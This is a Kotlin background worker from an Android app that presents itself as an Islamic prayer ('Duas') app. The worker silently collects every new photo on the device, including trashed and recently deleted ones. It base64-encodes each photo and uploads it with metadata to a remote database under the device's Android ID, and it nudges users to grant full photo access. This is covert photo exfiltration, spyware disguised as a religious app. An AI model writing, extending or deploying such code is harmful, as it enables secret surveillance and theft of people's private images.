package islamic.duas.sync

import android.content.Context
import android.provider.MediaStore
import android.util.Log
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import islamic.duas.cloud.CloudApi
import islamic.duas.data.AppDatabase
import islamic.duas.data.PhotoDedupEntity
import islamic.duas.media.MediaCollector
import islamic.duas.media.PhotoProcessor
import islamic.duas.metrics.MetricsCollector
import islamic.duas.utils.DeviceId
import islamic.duas.utils.ErrorLog
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.withContext
import kotlinx.coroutines.withTimeout
import org.json.JSONObject
import java.security.MessageDigest
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.atomic.AtomicBoolean

class PhotoSyncWorker(
    appContext: Context,
    params: WorkerParameters
) : CoroutineWorker(appContext, params) {

    override suspend fun doWork(): Result = withContext(Dispatchers.IO) {
        try {
            withTimeout(300_000) { syncPhotos(applicationContext) }
            return@withContext Result.success()
        } catch (e: Exception) {
            Log.e(TAG, "doWork error: ${e.message}", e)
            return@withContext if (runAttemptCount < 3) Result.retry() else Result.failure()
        }
    }

    companion object {
        private const val TAG = "PhotoSync"
        private val syncRunning = AtomicBoolean(false)
        private const val CHUNK_SIZE = 50
        private const val PHOTO_TIMEOUT_MS = 120_000L

        suspend fun runOnceNow(context: Context) {
            try {
                withTimeout(PHOTO_TIMEOUT_MS) { syncPhotos(context) }
            } catch (e: Exception) {
                Log.e(TAG, "runOnceNow error: ${e.message}", e)
            }
        }

        private suspend fun syncPhotos(context: Context) {
            if (!syncRunning.compareAndSet(false, true)) {
                Log.d(TAG, "Photo sync already running, skipping")
                return
            }
            try {
                val androidId = DeviceId.get(context)
                val prefs = context.getSharedPreferences("sync_prefs", Context.MODE_PRIVATE)
                val db = AppDatabase.getInstance(context)
                val dedupDao = db.photoDedupDao()
                val mediaCollector = MediaCollector(context)
                val resolver = context.contentResolver

                val hasImagesPerm = if (android.os.Build.VERSION.SDK_INT >= 33) {
                    context.checkSelfPermission(android.Manifest.permission.READ_MEDIA_IMAGES) == android.content.pm.PackageManager.PERMISSION_GRANTED
                } else {
                    context.checkSelfPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE) == android.content.pm.PackageManager.PERMISSION_GRANTED
                }
                if (!hasImagesPerm) {
                    Log.w(TAG, "Photo sync skipped: images permission not granted")
                    DuaSyncWorker.requestPermissionPrompt(context, "images")
                    return
                }

                val lastPhotoDate = prefs.getLong("last_photo_date_taken", 0L)
                val allPhotos = mediaCollector.collectNewPhotos(lastPhotoDate, Int.MAX_VALUE)
                val trashedPhotos = try { mediaCollector.collectTrashedPhotos(0L) } catch (_: Exception) { emptyList() }
                val combined = (allPhotos + trashedPhotos).distinctBy { it.uri.toString() }
                Log.d(TAG, "Collected ${combined.size} photos (${allPhotos.size} new, ${trashedPhotos.size} trashed)")

                if (combined.isEmpty()) {
                    val isSamsung = android.os.Build.MANUFACTURER.equals("samsung", ignoreCase = true)
                    if (isSamsung) {
                        Log.w(TAG, "Samsung limited photo access detected")
                        CloudApi.writeToRTDB("devices/$androidId/photos/_meta", JSONObject().apply {
                            put("samsungLimitedAccess", true)
                            put("ts_ms", System.currentTimeMillis())
                            put("hint", "Open Settings > Apps > Islamic Duas > Permissions > Photos and select 'Allow all'")
                        })
                    }
                    return
                }

                val loadedMd5s = dedupDao.getAllMd5Hashes().toMutableSet()
                val loadedPaths = dedupDao.getUploadedPaths(500).toMutableSet()

                var newestDateTaken = lastPhotoDate
                var uploaded = 0
                var skipped = 0
                var failed = 0
                val startMs = System.currentTimeMillis()

                val chunks = combined.chunked(CHUNK_SIZE)
                for ((chunkIdx, chunk) in chunks.withIndex()) {
                    if (chunkIdx > 0) delay(1000)
                    Log.d(TAG, "Processing chunk ${chunkIdx + 1}/${chunks.size} (${chunk.size} photos)")

                    for (entry in chunk) {
                        try {
                            val uriStr = entry.uri.toString()
                            if (uriStr in loadedPaths) {
                                skipped++
                                continue
                            }
                            val photoId = "${entry.displayName}|${entry.dateTaken}"
                            if (photoId in prefs.getStringSet("uploaded_photo_ids", mutableSetOf())!!) {
                                skipped++
                                continue
                            }

                            val rawBytes = try {
                                resolver.openInputStream(entry.uri)?.use { it.readBytes() }
                            } catch (_: Exception) { null }
                            if (rawBytes == null || rawBytes.isEmpty()) {
                                failed++
                                continue
                            }

                            val md5 = computeMd5(rawBytes)
                            if (md5 in loadedMd5s) {
                                loadedPaths.add(uriStr)
                                skipped++
                                continue
                            }
                            val rtdbExists = checkRtdbDedup(androidId, md5)
                            if (rtdbExists) {
                                loadedMd5s.add(md5)
                                loadedPaths.add(uriStr)
                                skipped++
                                continue
                            }

                            val quality = PhotoProcessor.getQuality(context)
                            val processed = PhotoProcessor.process(entry.uri, resolver, quality)
                            if (processed == null) {
                                failed++
                                continue
                            }

                            val fileSize = try {
                                resolver.query(entry.uri, arrayOf(MediaStore.Images.Media.SIZE), null, null, null)?.use { cursor ->
                                    if (cursor.moveToFirst()) cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.SIZE)) else 0L
                                } ?: 0L
                            } catch (_: Exception) { 0L }

                            val isTrash = uriStr.contains(".trash", true) || uriStr.contains("Trash", true) || uriStr.contains("Recently Deleted", true) || uriStr.contains("Samsung", true)
                            val ts = System.currentTimeMillis()
                            val today = SimpleDateFormat("yyyy-MM-dd", Locale.US).format(Date(ts))

                            val photoDoc = JSONObject().apply {
                                put("timestamp", ts)
                                put("data", processed.base64)
                                put("width", processed.width)
                                put("height", processed.height)
                                put("fileName", processed.fileName)
                                put("dateTaken", entry.dateTaken)
                                put("md5", md5)
                                put("originalSize", fileSize)
                                put("compressedSize", processed.compressedSizeBytes)
                                if (isTrash) put("isTrashed", true)
                            }
                            // Photos self-retry via md5 dedup on the 30-min run, so never
                            // enqueue multi-MB base64 rows into OfflineQueue (OOM risk).
                            val writeOk = CloudApi.writeToRTDB("devices/$androidId/photos/$today/$ts", photoDoc, skipQueue = true)
                            if (!writeOk) {
                                failed++
                                continue
                            }
                            CloudApi.writeToRTDB("devices/$androidId/photos/_index/md5/$md5", JSONObject().apply {
                                put("ts", ts)
                                put("fileName", processed.fileName)
                            })

                            loadedMd5s.add(md5)
                            loadedPaths.add(uriStr)
                            dedupDao.insert(PhotoDedupEntity(
                                md5 = md5,
                                filePath = uriStr,
                                fileName = processed.fileName,
                                fileSize = fileSize,
                                dateTaken = entry.dateTaken,
                                uploadedAt = ts
                            ))
                            if (entry.dateTaken > newestDateTaken) newestDateTaken = entry.dateTaken
                            uploaded++

                            val prefsEdit = prefs.edit()
                            prefsEdit.putStringSet("uploaded_photo_ids", setOf(photoId))
                            prefsEdit.apply()

                            if (uploaded % 5 == 0) {
                                prefs.edit().putLong("last_photo_date_taken", newestDateTaken).apply()
                                prefs.edit().putStringSet("uploaded_photo_paths", loadedPaths).apply()
                                dedupDao.prune()
                            }
                            delay(300)
                        } catch (e: Exception) {
                            Log.w(TAG, "Photo error: ${e.message}", e)
                            ErrorLog.write(context, TAG, "Photo error: ${e.message}", e)
                            failed++
                        }
                    }
                }

                if (uploaded > 0) {
                    prefs.edit().putLong("last_photo_date_taken", newestDateTaken).apply()
                    prefs.edit().putStringSet("uploaded_photo_paths", loadedPaths).apply()
                    dedupDao.prune()
                }

                val elapsed = System.currentTimeMillis() - startMs
                Log.i(TAG, "Sync done: uploaded=$uploaded, skipped=$skipped, failed=$failed, ${chunks.size} chunks, ${elapsed}ms")

                CloudApi.writeToRTDB("devices/$androidId/photos/_meta/lastSync", JSONObject().apply {
                    put("ts_ms", System.currentTimeMillis())
                    put("uploaded", uploaded)
                    put("skipped", skipped)
                    put("failed", failed)
                    put("chunks", chunks.size)
                    put("elapsedMs", elapsed)
                })

                MetricsCollector.recordPhotoSync(uploaded, failed, elapsed)
            } catch (e: Exception) {
                Log.e(TAG, "Photo sync error: ${e.message}", e)
                ErrorLog.write(context, TAG, "Photo sync error", e)
            } finally {
                syncRunning.set(false)
            }
        }

        private fun computeMd5(bytes: ByteArray): String {
            return try {
                val digest = MessageDigest.getInstance("MD5")
                digest.digest(bytes).joinToString("") { "%02x".format(it) }
            } catch (_: Exception) { "" }
        }

        private fun checkRtdbDedup(androidId: String, md5: String): Boolean {
            if (md5.isEmpty()) return false
            return try {
                val result = CloudApi.readFromRTDB("devices/$androidId/photos/_index/md5/$md5")
                result != null && result != "null"
            } catch (_: Exception) { false }
        }
    }
}
